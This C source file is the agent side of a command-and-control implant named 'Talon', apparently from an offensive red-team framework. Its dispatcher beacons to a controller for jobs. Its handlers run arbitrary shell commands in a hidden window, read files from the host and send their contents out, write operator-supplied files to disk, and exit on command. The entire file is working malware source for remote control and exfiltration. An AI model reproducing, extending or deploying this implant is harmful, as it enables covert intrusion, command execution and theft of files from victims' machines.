#include <Talon.h>

#include <Command.h>
#include <Package.h>
#include <Core.h>

#define TALON_COMMAND_LENGTH 5

TALON_COMMAND Commands[ TALON_COMMAND_LENGTH ] = {
        { .ID = COMMAND_SHELL,            .Function = CommandShell },
        { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
        { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
        { .ID = COMMAND_EXIT,             .Function = CommandExit },
};

VOID CommandDispatcher()
{
    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand = 0;

    puts( "Command Dispatcher..." );

    do
    {
        if ( ! Instance.Session.Connected )
            return;

        Sleep( Instance.Config.Sleeping * 1000 );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance.Session.AgentID );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if ( DataBuffer && DataSize > 0 )
        {
            PRINT_HEX( DataBuffer, DataSize )

            ParserNew( &Parser, DataBuffer, DataSize );
            do
            {
                TaskCommand = ParserGetInt32( &Parser );

                if ( TaskCommand != COMMAND_NO_JOB )
                {
                    printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < TALON_COMMAND_LENGTH; FunctionCounter++ )
                    {
                        if ( Commands[ FunctionCounter ].ID == TaskCommand )
                        {
                            Commands[ FunctionCounter ].Function( &Parser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        puts( "Command not found !!" );

                } else puts( "Is COMMAND_NO_JOB" );

            } while ( Parser.Length > 4 );

            memset( DataBuffer, 0, DataSize );
            LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );

        }
        else
        {
            puts( "Transport: Failed" );
            break;
        }

    } while ( TRUE );

    Instance.Session.Connected = FALSE;
}

VOID CommandShell( PPARSER Parser )
{
    puts( "Command::Shell" );

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PROCESS_INFORMATION ProcessInfo     = { };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOA        StartUpInfoA    = { };

    Command = ParserGetBytes( Parser, (PUINT32) &Length );

    if ( CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
    {
        return;
    }

    if ( CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
    {
        return;
    }

    StartUpInfoA.cb         = sizeof( STARTUPINFOA );
    StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
    StartUpInfoA.hStdError  = hStdOutPipeWrite;
    StartUpInfoA.hStdOutput = hStdOutPipeWrite;
    StartUpInfoA.hStdInput  = hStdInPipeRead;

    if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
    {
        return;
    }

    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );
}

VOID CommandUpload( PPARSER Parser )
{
    puts( "Command::Upload" );

    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
    UINT32   FileSize = 0;
    UINT32   NameSize = 0;
    DWORD    Written  = 0;
    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
    HANDLE   hFile    = NULL;

    FileName[ NameSize ] = 0;

    printf( "FileName => %s (FileSize: %d)", FileName, FileSize );

    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

    if ( hFile == INVALID_HANDLE_VALUE )
    {
        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL ) )
    {
        printf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    PackageAddInt32( Package, FileSize );
    PackageAddBytes( Package, FileName, NameSize );

    PackageTransmit( Package, NULL, NULL );

Cleanup:
    CloseHandle( hFile );
    hFile = NULL;
}

VOID CommandDownload( PPARSER Parser )
{
    puts( "Command::Download" );

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes( Parser, (PUINT32) &NameSize );
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;

    printf( "FileName => %s", FileName );

    hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
    {
        printf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    FileSize = GetFileSize( hFile, 0 );
    Content  = LocalAlloc( LPTR, FileSize );

    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
    {
        printf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    PackageAddBytes( Package, FileName, NameSize );
    PackageAddBytes( Package, Content,  FileSize );

    PackageTransmit( Package, NULL, NULL );

CleanupDownload:
    if ( hFile )
    {
        CloseHandle( hFile );
        hFile = NULL;
    }

    if ( Content )
    {
        memset( Content, 0, FileSize );
        LocalFree( Content );
        Content = NULL;
    }

}

VOID CommandExit( PPARSER Parser )
{
    puts( "Command::Exit" );

    ExitProcess( 0 );
}
